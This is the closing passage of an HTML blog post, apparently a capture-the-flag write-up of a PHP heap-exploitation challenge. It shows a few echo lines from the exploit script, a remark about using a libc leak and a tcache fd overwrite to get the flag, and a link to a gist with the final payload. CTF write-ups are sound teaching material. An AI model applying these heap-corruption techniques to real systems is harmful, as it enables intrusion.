+</span></span></span><span style=display:flex><span><span style=color:#bb9af7>echo</span> <span style=color:#9ece6a>&#34;START</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#bb9af7>echo</span> $buf2[<span style=color:#e0af68>77</span>] <span style=color:#9ece6a;font-weight:700>.</span> <span style=color:#9ece6a>&#34;</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#bb9af7>echo</span> <span style=color:#9ece6a>&#34;END</span><span style=color:#7aa2f7>\n</span><span style=color:#9ece6a>&#34;</span>;
+</span></span></code></pre></div><p>Since we already have libc leak and the offset to x[2] from x[0] to overwrite tcache fd, we can start our initial attack and get the flag.</p><h2 id=exploit-stuff>Exploit Stuff</h2><p>The final payload and scripts are in my gists, <a href=https://gist.github.com/circleous/2e8b92c7e592e29a58577a9080fdbfb4>https://gist.github.com/circleous/2e8b92c7e592e29a58577a9080fdbfb4</a></p><div><div>Tags:</div><ul><li><a href=/tags/ctf-writeup/>Ctf-Writeup</a></li><li><a href=/tags/pwn/>Pwn</a></li><li><a href=/tags/php/>Php</a></li></ul></div></article></main><footer><p>&copy; 2025 circleous. Licensed under <a href=https://creativecommons.org/publicdomain/zero/1.0/ target=_blank>CC0</a>.</p></footer></body></html>
